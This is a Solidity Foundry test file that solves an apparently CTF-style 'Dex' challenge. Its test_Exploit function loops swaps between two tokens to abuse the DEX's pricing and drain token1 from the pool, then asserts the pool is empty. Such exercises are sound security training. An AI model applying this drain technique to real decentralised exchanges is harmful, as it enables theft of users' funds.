// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

contract DexTest is Test {
    SwappableToken public swappabletoken1;
    SwappableToken public swappabletoken2;
    Dex public dex;
    address attacker = makeAddr("attacker");

    function setUp() public {
        dex = new Dex();
        swappabletoken1 = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletoken1), "Token 1");
        swappabletoken2 = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletoken2), "Token 2");
        dex.setTokens(address(swappabletoken1), address(swappabletoken2));

        dex.approve(address(dex), 100);
        dex.addLiquidity(address(swappabletoken1), 100);
        dex.addLiquidity(address(swappabletoken2), 100);

        vm.label(attacker, "Attacker");
        
        // Set up the attacker with some initial balance
        swappabletoken1.transfer(attacker, 10);
        swappabletoken2.transfer(attacker, 10);
        

        //DO_NOT_TOUCH
    }

    function test_Exploit() public {
       //Execute the attacker here.
       
        vm.startPrank(attacker);
        dex.approve(address(dex), type(uint256).max);

        while (swappabletoken1.balanceOf(address(dex)) > 0) {
            if(swappabletoken1.balanceOf(attacker) > 0) {
                uint256 attackerBal = swappabletoken1.balanceOf(attacker);
                uint256 leftInDex = swappabletoken1.balanceOf(address(dex));
                uint256 swapAmt = attackerBal > leftInDex ? leftInDex : attackerBal;
                dex.swap(address(swappabletoken1), address(swappabletoken2), swapAmt);
            } else { uint256 attackerBal = swappabletoken2.balanceOf(attacker);
                uint256 leftInDex = swappabletoken2.balanceOf(address(dex));
                uint256 swapAmt = attackerBal > leftInDex ? leftInDex : attackerBal;
                dex.swap(address(swappabletoken2), address(swappabletoken1), swapAmt);
            }

            console.log("Attacker balance of token1: ", swappabletoken1.balanceOf(attacker));
            console.log("Attacker balance of token2: ", swappabletoken2.balanceOf(attacker));
            console.log("Dex balance of token1: ", swappabletoken1.balanceOf(address(dex)));
            console.log("Dex balance of token2: ", swappabletoken2.balanceOf(address(dex)));
        }
        vm.stopPrank();
       
        is_Drained();
    }

    function is_Drained () internal view{
         require(swappabletoken1.balanceOf(address(dex)) == 0);
    }

}
